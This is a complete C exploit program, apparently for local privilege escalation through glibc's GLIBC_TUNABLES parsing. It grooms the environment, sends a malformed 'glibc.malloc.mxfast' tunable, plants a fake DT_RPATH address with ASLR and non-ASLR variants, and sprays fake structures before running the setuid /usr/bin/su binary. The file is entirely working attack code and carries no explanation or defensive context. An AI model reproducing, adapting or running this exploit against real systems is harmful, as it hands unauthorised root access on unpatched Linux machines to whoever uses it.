#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

#include <stdio.h>

#define ENV_NAME "GLIBC_TUNABLES="
#define TRIGGER ENV_NAME "glibc.malloc.mxfast=glibc.malloc.mxfast="

#ifndef NO_ASLR
#define FAKE_DT_RPATH "\x10\xf0\xff\xff\xfd\x7f"
#else
#define FAKE_DT_RPATH "\xe0\xee\xff\xff\xff\x7f"
#endif

char* argv[] = { "/usr/bin/su", NULL };

void groom(char*** p, size_t n) {
	char* buf = malloc(n + 1);

	strcpy(buf, ENV_NAME);
	for (size_t i = sizeof(ENV_NAME) - 1; i < n; i++) {
		buf[i] = 'A';
	}

	**p = buf;
	*p += 1;
}

void trigger(char*** p, size_t n) {
	char* buf = malloc(sizeof(TRIGGER) + n + 1);

	strcpy(buf, TRIGGER);
	for (size_t i = sizeof(TRIGGER) - 1; i < n + sizeof(TRIGGER) - 1; i++) {
		buf[i] = '=';
	}

	**p = buf;
	*p += 1;
}

void insert_null(char*** p, size_t n) {
	for (size_t i = 0; i < n; i++) {
		**p = "";
		*p += 1;
	}
}

void insert_string(char***p, char* s) {
	**p = s;
	*p += 1;
}

void insert_fakestruct(char*** p, size_t x, size_t n) {
	char* buf = malloc((x+1) * sizeof(char*));
	size_t i;
	
	for (i = 0; i < x; i++) {
		((int64_t*)buf)[i] = -20;
	}

	((int64_t*)buf)[x] = 0x0041414141414141;
	
	for (i = 0; i < n; i++) {
		**p = buf;
		*p += 1;
	}
}

int main(void) {
	char** envp = calloc(0x10000, sizeof(char*));
	char** p = envp;

	groom(&p, 0xc0f);

	trigger(&p, 0x3f0);

	insert_null(&p, 0xdb);

	insert_string(&p, FAKE_DT_RPATH);

	insert_null(&p, 0x321);

	groom(&p, 0x40f);

	insert_fakestruct(&p, 0x3fff, 0xf);

	insert_null(&p, 0x4);

	execve("/usr/bin/su", argv, envp);
}